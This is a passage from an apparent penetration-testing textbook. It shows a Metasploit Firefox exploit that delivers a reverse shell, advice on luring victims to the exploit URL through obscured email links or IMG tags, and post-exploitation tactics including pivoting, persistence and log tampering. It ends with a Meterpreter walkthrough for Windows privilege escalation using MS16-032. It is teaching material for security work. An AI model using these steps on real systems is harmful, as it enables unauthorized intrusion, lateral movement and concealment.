
## Firefox exploit module in msfconsole (continued)

- SSL Cert no Path to a custom SSL certificate (default is randomly generated)
- URIPATH no The URI to use for this exploit (default is random)

Exploit target:

| Id | Name |
|---|---|
| 0 | Firefox 3.6.16 on Mac OS X (10.6.6, 10.6.7, 10.6.8, 10.7.2 and 10.7.3) |

```
msf exploit(osx/browser/mozilla_mchannel) > exploit
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 192.168.86.62:4444
msf exploit(osx/browser/mozilla_mchannel) >
[*] Using URL: http://0.0.0.0:8080/42hKAQwClk0t
[*] Local IP: http://192.168.86.62:8080/42hKAQwClk0t
[*] Server started.
```

You'll see a couple of things here. This exploit starts a server. This means you need to indicate what IP address the server should be listening on, as well as the port. By default, the server will be listening on 0.0.0.0, which means every IP address on the system. You can also specify the port. Listening on ports with numbers lower than 1024 requires administrative privileges. By default, the module listens on port 8080. When the server starts up, a URL is randomly generated, though you can provide one in the options if you prefer. Once the server starts up, the module provides the URL.

Starting up the exploit also creates a listener, expected to handle the return connection from the target system. The return connection comes from the payload that is delivered to the target when they make the connection, if the vulnerability is exploited. This means that you need to get the URL to your target. There are several ways to do that, including sending email with the URL obscured, since a URL that includes elements like :8080 and then a random string may be suspicious. This is not to say that you need to use the random string or the unusual port. You could also create a link in a web page that you expect your targets to regularly visit. The URL could be loaded automatically by placing it in a page element like an IMG tag. A browser encountering that tag will issue a GET request to the URL provided.

Once you get your victim to visit the URL, their browser makes a request that gets handled by Metasploit. The module should send the exploit code to the browser. If the exploit is successful, it should fire a connection back to the handler that the exploit started up. What you'll get back from that connection is a shell on the system. Since the exploit is against a MacOS (OSX) system, and MacOS uses a Unix-like operating system and userland, what you’ll get back is a Bash shell where you can send commands. This particular exploit doesn’t support a Meterpreter payload.
Gaining access to the system is only a part of what an attacker would do, so it’s only a part of what you would be doing as an ethical hacker. Gaining access is only a start.

## Post Exploitation

You now have a foothold on the system. What you can do with it depends on what you compromised. You may have limited permissions if the remote service you compromised has limited permissions. You can only perform tasks that you have permissions to perform. This means you may need to escalate your privileges to a user with more than you have.
Gaining root or administrator permissions is a common objective for attackers, since it helps them pivot to other systems to move laterally within the environment. You may also have a better chance to collect passwords and other critical system information that you may need for other tasks.

You not only have a foothold on the system, but that system gives you a foothold on the network as well. You may find, especially if you have compromised a system offering services to the outside world, that the system is connected to more than one network. This means you can use the compromised system as a gateway to those other networks. This is a technique called pivoting, where you pivot off the compromised system to take a look at another set of systems. This will get you further into the network and potentially gain you even more sensitive information or access to more critical systems.

Attackers will also look to gain persistent access to the system. This may mean a number of activities, from creating users to installing backdoors. Alongside persistent access, the attacker will want to cover their tracks. This can mean hiding data in places on the system. It may mean manipulating logs. It can also mean manipulating system binaries to help hide your existence.

## Privilege Escalation

Your mission, should you choose to accept it, is to gain root-level access. There was a time when services ran as root on Unix/Linux systems or as LocalSystem on Windows systems, which is an account that has a very high level of permissions. Once you have root-level access, you should be able to gain access to all information on the system as well as make changes to services and manipulate users. What this means is that you need to get access to the system first, and then you’ll need to run another exploit to get elevated privileges.
We can continue to use Metasploit for this, so let’s start with a compromised system with a Meterpreter shell. If we background the shell using the background, we can make use of the open session as a way of interacting with the system.

We need to identify a local exploit. One way of doing this is to use the Python script windows-exploit-suggester.py. This is a script that can be downloaded from GitHub. It requires a couple of things to run beyond a Python interpreter. First is the output from systeminfo. Second is the database containing the Microsoft security bulletins (MSSB) information. In order to get the first, we'll pull it from our exploited Windows system. We can drop to a Windows shell from Meterpreter and run systeminfo, redirecting the output to a file, then we can pull that file back to our local system. You can see that process in the following listing.

### Getting system patch information

```
meterpreter > shell
Process 3 created.
Channel 3 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Program Files\elasticsearch-1.1.1>systeminfo > patches.txt

C:\Program Files\elasticsearch-1.1.1>exit

meterpreter > download patches.txt
[*] Downloading: patches.txt -> patches.txt
[*] Downloaded 2.21 KiB of 2.21 KiB (100.0%): patches.txt -> patches.txt
[*] download : patches.txt -> patches.txt
```

Once we have the patch information, we can move on to using windows-exploit-suggester. We're going to get an updated MSSB database and then we'll run the script with our two files, looking for local exploits. You can see running the script in the next code listing. What we will get is a list of local exploits that could potentially be run against our compromised system. It doesn't provide any details about Metasploit modules, which means we'll still need to do some searching for that. However, it does provide resources if you want to learn more about the vulnerabilities and the exploit.

### Getting local exploit suggestions

```
root@quiche:~# ./windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2018-09-09-mssb.xls
[*] done
root@quiche:~# ./windows-exploit-suggester.py -i patches.txt -d 2018-09-09-mssb.xls -l
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 2 hotfix(es) against the 407 potential bulletin(s) with a database of 137 known exploits
[*] there are now 407 remaining vulns
[*] searching for local exploits only
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 SP1 64-bit'
[*]
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*] https://github.com/foxglovesec/RottenPotato
[*] https://github.com/Kevin-Robertson/Tater
[*] https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
--- snip ---
[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
[*] http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
[*]
[*] done
```

Some of the suggested exploits won't run against Windows on Windows (WoW) 64. This is a subsystem that allows 32-bit Windows executables to execute on 64-bit Windows installations. The exploit would need the ability to run within this subsystem and still be able to exploit the vulnerability. As there is an additional layer of software on 64-bit Windows, some exploits just won't work. We're going to use the MS16-032 vulnerability. We need to identify the Metasploit module associated with that vulnerability, which means we can just search for the Microsoft vulnerability, as you can see in the following code listing. Searching for the vulnerability returns a single module.

### Searching for local exploit

```
msf exploit(windows/local/ms15_051_client_copy_image) > search MS16-032
```

| Name | Disclosure Date | Rank | Description |
| :--- | :--- | :--- | :--- |
| exploit/windows/local/ms16_032_secondary_logon_handle_privesc Secondary Logon Handle Privilege Escalation | 2016-03-21 | normal | MS16-032 |

```
exploit(windows/local/ms15_051_client_copy_image) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```

Keep in mind that at this point, we have a session open to our target system. In order to use the local exploit, we need to set the session number we have open. If you need to know which session number to use because you've lost track, you can just use the sessions
